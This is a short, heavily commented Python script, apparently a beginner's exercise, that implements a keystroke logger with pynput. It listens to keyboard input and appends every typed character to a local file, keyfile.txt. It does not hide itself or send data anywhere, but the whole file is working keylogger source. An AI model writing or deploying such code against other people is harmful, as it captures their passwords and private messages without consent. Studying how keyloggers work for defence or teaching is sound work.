from pynput import keyboard

def keyPressed(key):
    #with statement is used as it closes the file automatically and when error is raised, but doing the same manually using close() function consumes more lines of code
    #logkey helps identify the line open("keyfile.txt", 'a')
    with open("keyfile.txt", 'a') as logKey:
        #try statement runs whatever is inisde the block and if it raises an error while doing that, the except block runs
        try:
            #only takes the characters and not literal buttons as the listener function listens to all keys including mouse
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

#keyboard.Listener() function listens to the inputs of all keys in keyboard and mouse; on_press calls the defined function keyPressed() along with its parameters (key)
listener = keyboard.Listener(on_press=keyPressed)
listener.start()
#without input() the code would terminate as the python file is closed once all the lines are executed. this would seem as if no keys were registered as input?
input()
